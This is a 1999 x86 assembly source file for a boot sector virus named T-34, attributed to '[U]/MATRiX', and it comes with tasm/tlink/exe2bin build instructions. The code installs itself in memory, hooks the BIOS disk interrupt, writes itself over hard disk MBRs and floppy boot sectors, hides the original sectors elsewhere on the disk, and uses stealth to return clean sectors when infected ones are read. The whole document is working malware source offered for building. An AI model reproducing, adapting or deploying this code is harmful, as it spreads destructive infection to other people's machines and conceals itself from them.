comment ^

T-34 ViRuS by [U]/MATRiX

compile it with:
tasm /m t34.asm
tlink /x t34.obj
exe2bin t34.exe vboot.bin

November 1999

^


.286                   
.model tiny
.code
org 0h

len  equ offset buff - 3eh                 ; virus code lenght 
id_  equ offset id - offset start + offset buff - offset start

start:
 db 0ebh,3ch     	; jump to virus
 db 3ch dup (0)  	; table of disk parameters in BOOT sector
 xor ax,ax		; zer0
 cli             	; disable interrupts
 mov ss,ax		; SS=0
 mov sp,7c00h    	; SP=7C00h                    
 sti             	; enable interrupts
 push ax
 pop ds          	; ds=0
 mov di,54h		; 'T'
 add di,34h		; '34'
 add di,325h
 mov ds,ax       	; ds=0
 mov ax,[ds:0413h]      ; subtract 1 Kb of memory
 dec ax
 mov [ds:0413h],ax
 mov cl,5		; convert from kilobytes to paragraphs
 add cl,1
 shl ax,cl
 mov es,ax       	; es:=ax          
 mov si,7c00h    	; DS:SI=0:7C00h (beginning of virus)
 xor di,di
 mov cx,256      	; how many bytes to copy
 cld			; clear directional flag
 rep movsw      	; write us to memory
 push es		; save the new segment on stack
 lea ax, [memory]
 push ax		; save the offset where to jump
 retf            	; jmp to virus code
memory:
 mov si,4ch             ; get int 13h
 mov di,offset ofs_13   ; copy 2 words to variables
 cld			; clear directional flag
 movsw                  ; offset 
 movsw                  ; segment
 mov word ptr [ds:4ch],offset myint13h ; new int13h handler
 mov word ptr [ds:4eh],es
 push cs
 pop ds      		; ds:=cs
 cmp [drive],80h 	; boot from HDD ?
 jne hdd			; not equal? jump to hdd
 mov cx,4        	; boot sector 0/0/2
 mov dx,80h      	
 jmp short @h_b00t
hdd:
 mov dx,80h      	; hdd start
 read:
 mov ax,0201h    	; read MBR
 mov bx,offset buff
 mov cx,1        	; cylinder 0 sector 1
 call int13_
 jc er
 cmp word ptr [buff+1feh],0aa55h ; is it valid MBR ?
 jne er
 cmp word ptr [ds:id_],0deadh ; is it already infected ?
 je er
 mov ax,0301h    	; write original MBR in 0/0/4
 mov cx,4        	; cylinder 0 sector 4
 int 13h
 jc er
 mov [drive],80h 	; boot from HDD
 ; copy virus code in MBR
 mov word ptr[buff],3cebh ; write near jmp in new sector
 mov cx,len   
 mov si,3eh             ; from offset 3eh to 3eh 
 mov di,offset buff + 3eh ; ( don't overwrite BPB in BOOT )
 cld
 rep movsb       	; copy virus code 
 mov ax,0301h    	; write new MBR
 mov cx,1 
 int 13h
er:
 cmp dl,80h      	; first HDD ?
 jne @f_b00t
 inc dl
 jmp short read  	; try second HDD
@f_b00t:
 mov cx,14       	; boot sector 0/1/14
 mov dx,0100h
@h_b00t:
 xor ax,ax
 mov es,ax       	; es:=0
 mov ax,0201h    	; read the original MBR/BS in memory
 mov bx,7c00h
 call int13_
 push es
 push bx
 retf
rexit:
 jmp dword ptr [cs:ofs_13] ; jmp to old int 13h
myint13h:
 cmp dh,0        	; check if head 0
 jne rexit
 cmp cx,1        	; cylinder 0 sector 1 ?
 jne rexit
 cmp ah,2h      	; read from sector 1 ?
 jne rexit
 call int13_     	; execute reading
 jc rexit        	; exit if an error
 push ax, bx, cx, dx    ; save registers
 push si, di, es, ds	; pusha
 cmp word ptr es:[bx+offset id],0deadh   ; is already infected ?
 je stealth 		; already infected => stealth			 
			; no infect? infect it!!! 
 cmp dl,80h   		; is it the harddisk  
 jae d_psh
 push cs         	; try to infect
 pop es          	; es:=cs
 push cs
 pop ds          	; ds:=cs
 mov ax,0201h    	; read one sector
 mov bx,offset buff 	; put it in CS:512
 call int13_		; do it!!!
 jc d_psh
 cmp word ptr [buff+1feh],0aa55h ; is it valid BOOT sector ?
 jne d_psh   
 cmp byte ptr [buff+14h],0f0h    ; 1.44 - diskette ?
 jne d_psh
 cmp word ptr [ds:id_],0deadh ; is it already infected ?
 je d_psh
 mov ax,0301h    	; write old Boot in 0/1/15  ( c/h/s )
 mov cx,14
 mov dh,01h      	; head 1
 int 13h     
 jc d_psh
 mov [drive],00h
 ; copy virus
 mov word ptr[buff],3cebh ; write near jmp in new sector
 mov cx,len   
 mov si,3eh             ; from offset 3eh to 3eh 
 mov di,offset buff + 3eh ; ( don't overwrite BPB in BOOT )
 cld
 rep movsb              ; copy virus code     
 ; copy virus code
 mov ax,0301h    	; write new Boot
 mov cx,1 
 xor dh,dh       	; head 0
 int 13h
 jmp short d_psh
stealth:
 mov cx,4        	; old MBR of hdd in sector 0/0/4 
 xor dh,dh
 cmp dl,80h        	; is it hdd ( maybe second ) ?
 jae yeh
 mov cx,14       	; old b00t of fdd in sector 0/1/14
 mov dh,1    
yeh:
 mov ax,0201h    	; overwrite first 512 bytes with old Boot sector
 call int13_
d_psh:
 ; restore regs
 pop ds,es,di,si
 pop dx,cx,bx,ax
exit:
 retf 2

int13_ proc             ; call original int 13h
 pushf                   
 call dword ptr[cs:ofs_13]
 ret
endp
drive   db 80h
id      dw 0deadh
ofs_13  dw 0
seg_13  dw 0
buff:
end start
